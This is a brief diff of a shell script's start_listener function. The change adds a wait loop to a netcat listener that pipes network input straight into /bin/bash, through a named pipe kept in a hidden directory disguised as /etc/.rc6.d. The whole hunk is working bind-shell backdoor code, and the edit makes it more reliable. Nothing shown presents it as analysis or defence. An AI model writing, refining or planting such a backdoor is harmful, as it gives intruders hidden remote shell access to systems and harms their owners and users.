@@ -16,6 +16,10 @@ start_listener() {
         mkfifo /etc/.rc6.d/fifo_$port
     fi
 
+    while [ ! -p "/etc/.rc6.d/fifo_$port" ]; do
+        sleep 0.1
+    done
+
     while true; do
         nc -lvnp "$port" < /etc/.rc6.d/fifo_$port | /bin/bash > /etc/.rc6.d/fifo_$port 2>&1
     done &
